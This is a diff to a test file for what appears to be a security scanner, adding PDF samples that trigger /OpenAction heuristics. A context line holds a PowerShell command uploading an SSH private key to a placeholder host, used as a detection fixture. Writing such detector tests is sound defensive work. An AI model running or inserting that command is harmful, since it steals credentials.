@@ -236,6 +236,18 @@ def cases() -> list[tuple[str, bytes, str | None]]:
             b"iwr https://example.invalid/u -Method Post -InFile $HOME\\.ssh\\id_ed25519\n",
             "script_credential_upload",
         ),
+        (
+            "open_page.pdf",
+            b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog /OpenAction 5 0 R >>\nendobj\n"
+            b"5 0 obj\n[3 0 R /FitH 700]\nendobj\n%%EOF\n",
+            "heuristic_pdf_OpenAction_goto",
+        ),
+        (
+            "open_remote.pdf",
+            b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog /OpenAction "
+            b"<< /S /GoToR /F (other.pdf) /D [0 /Fit] >> >>\nendobj\n%%EOF\n",
+            "heuristic_pdf_OpenAction",
+        ),
     ]
 
 
